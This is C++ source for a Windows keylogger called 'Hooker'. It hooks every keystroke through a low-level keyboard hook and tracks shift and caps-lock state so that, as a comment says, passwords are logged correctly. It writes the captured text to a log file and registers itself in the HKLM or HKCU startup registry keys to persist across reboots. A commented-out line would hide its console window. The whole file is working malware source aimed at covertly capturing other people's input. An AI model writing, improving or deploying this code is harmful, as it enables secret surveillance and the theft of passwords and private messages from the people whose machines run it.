
#include "HookerHead.h"

using namespace std;
string str = "";
LSTATUS registryAddingStatus;
const string logFileName = "HookerLogs.txt";
LPCSTR hookerRegistryName = "Hooker";
static bool capsLockPressed = false;
static bool isShiftPress = false;
ofstream outStream;
int fileOpenMode = (int)ios_base::app; //open existing file. Do not overide it !
const int maxAllowedStringLenght = 50;
HHOOK hHook = NULL;
const int bufferSize = 300;

int main(){
	
	//Hide the console window and make it run at background 
	//If you execute the .exe file stop the process manualy
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	bool isRegisterAdded = CheckIfRegistryKeyExist(hookerRegistryName); // Do not add new record in the registers
	if (!isRegisterAdded) {
		//Try to add new key in register in the HKEY_LOCAL_MACHINE - it will apply
		//the changes globaly for all users using this PC.
		//Need administrative pri Administrative privileges
		AddProgramInHKEY_LOCAL_MACHINERegister(registryAddingStatus);
		if (registryAddingStatus != ERROR_SUCCESS) { // ERROR_SUCCESS is returned if the adding was successful
															 //the adding key in HKEY_LOCAL_MACHINE is failed, moutly due to not Administrative privileges
			AddProgramInHKEY_CURRENT_USER(registryAddingStatus);		
		}
		cout << registryAddingStatus << endl;
	}
	
	//Define the keyboard hook
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HoockCallback, NULL, 0);
	if (hHook == NULL) {
	}
	//Infinite loop to keep the programe live and wait for keyboard event
	while (GetMessage(NULL,NULL,0,0))
	{

	}
	outStream.open(logFileName,fileOpenMode);
	outStream << str;
	outStream.close();

	return 0;
}
LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT *)lParam);
	if (wParam == WM_KEYDOWN) {
		//We are interest in case when shft key is pressed and hold !
		if (cKey.vkCode == VK_LSHIFT || cKey.vkCode == VK_RSHIFT) {
			isShiftPress = true; // UpperCase 
		}
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	}
	
	//Defining a buffer in the callback
	//Get the keyboard state 
	BYTE keyboard_state[bufferSize];
	GetKeyboardState(keyboard_state);
	UpdateKeyState(keyboard_state, VK_SHIFT);
	UpdateKeyState(keyboard_state, VK_CONTROL);
	UpdateKeyState(keyboard_state, VK_MENU);
	HKL keyboardLayout = GetKeyboardLayout(0);
	char lpszName[255] = { 0 };
	DWORD dwMsg = 1;
	dwMsg += cKey.scanCode << 16;
	dwMsg += cKey.flags << 24;
	int i = GetKeyNameText(dwMsg, (LPTSTR)lpszName, bufferSize);
	ProcessEvent(lpszName, cKey.vkCode, str, wParam, outStream);
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

//This method update the given key state
void UpdateKeyState(BYTE *keystate, int keyCode) {
	keystate[keyCode] = GetKeyState(keyCode); // getin the state of the key
}

void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstream &outputSteam) {
	// we need to record the input in more meaningfull format than just chars
	//if enter is pressed, we can asume that a message or input data are send somewhere - website email chatbox
	//end we record that 
	switch (codeNum)
	{
	case 20 : //we need to have key sensitiv hook in order to have valid logs for password for example
		if (capsLockPressed == true) {
			capsLockPressed = false;
		}
		else {
			capsLockPressed = true;
		}
		break;
	case 32: str += " "; // add emty string 
		break;
	case 13: //Enter
		//Write to the file. Later this will be changed, but for now on enter press write new line		
		outStream.open(logFileName);
		outStream <<str;
		outStream << "\r\n";
		outStream.close();
		break;
	case 8: //Backspace
		//remove the last char of str
		str[str.size() - 1] = NULL;
		break;
	case 9 :
		str += " "; // Tab. Very often used by user when the go form one input field to other
		break;
	case 160: //shift is released
		isShiftPress = false;
		break;
	default: 
		if (isShiftPress == false && capsLockPressed == false) {
			// then the symbol is lower case 
			str += tolower(*lpszName);
		}
		else {
			str += lpszName;
		}
			
		break;
	}
}
bool CheckIfRegistryKeyExist(const LPCSTR &keyName) {
	HKEY hKey = NULL;
	LONG result = RegQueryValueEx(hKey, keyName, NULL, NULL, NULL,NULL);
	if (result == ERROR_SUCCESS) {
		return true;
	}
	return false;
}
//Administrative access is required in order to execute this fuction
//If the current logged user is Administrator this will add the Hooker.exe
//in the registers, so the logger will star on reboot
//If this is successfull then the Hooker.exe will need only one manual start form the user
//then he will infect the windows registers
void AddProgramInHKEY_LOCAL_MACHINERegister(LSTATUS &status) {
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY hKey;
	LSTATUS s = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_PATH, 0, NULL, &hKey);
	//To delete this you need to go in the register and manualy delete the Hooker key
	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
    RegCloseKey(hKey);
}
void AddProgramInHKEY_CURRENT_USER(LSTATUS &status) {
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY hKey;
	LSTATUS s = RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, &hKey);
	status = RegSetValueEx(hKey, hookerRegistryName, 0, REG_SZ, (LPBYTE)szPath, 0);
	RegCloseKey(hKey);
}
